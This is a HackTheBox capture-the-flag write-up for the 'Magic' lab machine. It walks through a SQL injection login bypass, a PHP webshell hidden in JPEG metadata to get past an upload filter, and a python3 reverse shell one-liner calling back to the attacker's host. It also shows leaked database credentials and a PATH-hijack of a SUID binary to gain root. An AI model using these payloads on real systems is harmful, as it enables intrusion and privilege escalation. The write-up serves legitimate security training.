
# Magic - HackTheBox WriteUp
![info_card](/images/magic/info.png)

## Enumeration & Information Gathering
#### Scanning 

As usual, we start we start with a full Nmap scan of the IP address:

```
nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oA _full_tcp_nmap 10.10.10.185
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
```




#### Service Enumeration 
**22:**

>root@kali:~/Desktop# nc 10.10.10.185 22
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

Not much to see here.

**80:**

Visiting the home page, there is a link at the bottom to log in.

![home](/images/magic/home.png)

Clicking takes us to a login page.

![login](/images/magic/login.png)

## Exploitation 
#### Foothold 

One of the first things one should test on a login page is SQL injection and SQL injection lohin bypass.

Was able to bypass login with:

> admin' #
> 
Note to self: The login page did not allow typing more than 6 chars, copy pasting allowed more, interestingly, I could not type out "admin' #" I always had to copy and paste it. 

Upon login we are presented with a page to upload files.

![upload](/images/magic/upload.png)

As admin we try upoad files but we get an error

```
"Only jpg,jpeg and png can be uploaded"
```
We try changing th extension and get a different error


```
what are you trying to do
```

We have to make the file have the same magic bytes as a jpg,jpeg or png.

If gif's were allowed we could have probably gotten off easier just by addin GIF89a before the body of the request.

Anyway, to inject php code into an image we can use exiftool and either add a the php code with the  "-Comment" or "DocumentName" and probably other fields.

We grab a simple php webshell already in Kali, add a little html to it and add that to an image with exift as below:

```
root@kali:~/Downloads# exiftool -DocumentName="<h1>LateComerz<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" hk.jpeg 

    1 image files updated

root@kali:~/Downloads# mv hk.jpeg hk.php.jpeg
```

![uploaded](/images/magic/uploaded.png)

In order to find your file after upload, go to back to the home page and checkout the url of the jpg's on there. 

You can also do a recursive dirsearch for jpg extensions such as

```
python3 dirsearch.py -u http://10.10.10.185/ -e jpg -r -R 3

[23:35:52] 301 -  321B  - /images/uploads  ->  http://10.10.10.185/images/uploads/
```
While the parameters mean:
```
-u: url
-e: extensions
-r: recursive
-r: recursion depth
-w: wordlist[optional, used default]
```

We navigate to /images/uploads/ but get a forbidden error.

![cmd](/images/magis/cmd.png) 

After navigating to the file, we can run a few enumeration commands to find out which tools are available on the host (eg. which nc, which python(3), locate python, etc ..)
We discover we have python3 so we chose that to create the reverse shell back to our host

Run a netcat listener and a python reverse shell oneliner (http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) in the cmd parameter

>nc -lnvp 443
>
>/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.45",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


![python_rev_shell](/images/magis/rev_shell.png) 

Get a proper shell by runnig
>ctrl+z, stty raw -echo, fg, enter, enter)


#### Post Exploitation Enumeration 

We can check the file upload restrictions from upload.php
![up_check](/images/magic/up_check.png) 

The bad SQL:

![bad_sql](/images/magic/bad_sql.png) 

Viewing the db.php5 file we find credentials belonging to theseus

![db_file](/images/magic/db_file.png)

 
>private static $dbUsername = 'theseus';
>private static $dbUserPassword = '**iamkingtheseus**';

Tried to authenticate using mysql client and it was not installed.
Wrote a quick php to connect usng PDO just like in the script but ran into driver issues.

Looked for alternative ways to query mysql and found "mysqlshow"

With mysqlshow could show db and tables but could not query fields values.

Further checking other mysql tools "mysqldump" seems like a good one to try.



We are golden as we find Creds!

Th3s3usW4sK1ng

Try swicthing to theseus user and we are successful!

>www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
theseus@ubuntu:/var/www/Magic$ pwd
/var/www/Magic
theseus@ubuntu:/var/www/Magic$

We can now read the user flag.

![user_flag](/images/magic/user_flag.png) 

## Privilege Escalation 
Privilege escalation on this box was fairly easy.

Searching for suid binaries returns a file /bin/sysinfo

>theseus@ubuntu:/tmp$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(**theseus**),100(**users**)

>theseus@ubuntu:/tmp$ find / -perm -u=s -type f -group **theseus** 2>/dev/null 
>
>theseus@ubuntu:/tmp$ find / -perm -u=s -type f -group **users** 2>/dev/null 

>/bin/sysinfo
cat sysinfo


Running an enumeration script like linpeas.sh or LinEnum.sh would most likely return this as well.

Since the commands are being run as root (thanks to the suid bit) and without the full path, we can create a script with the same name of the command (eg. free) and then add the parent folder of the script as the first path to our environment variable 

>cd /tmp && touch free

Add commands to your script using nano (set $TERM envinronment variable first ) or echo

``` 
#this is my custom free script

echo $(whoami) && cat /root/root.txt

```
Make the file an executeable:

>theseus@ubuntu:/tmp$ chmod +x free

Then add /tmp to PATH and run:

>theseus@ubuntu:/tmp$ export PATH=/tmp:\$PATH
>theseus@ubuntu:/tmp$ /bin/sysinfo

This confirms that were are running as root and prints the root flag, however, we want shell on the box, so we add reverse shell to script (note: the bash reverse shells didn't work for me, fd error, python FTW).

![root](/images/magic/root.png)

**Conclusion:**

Great box to practice Enumeration and basic Linux Privesc. Sharpened File upload bypass skills and simple SQLi authentication bypass.
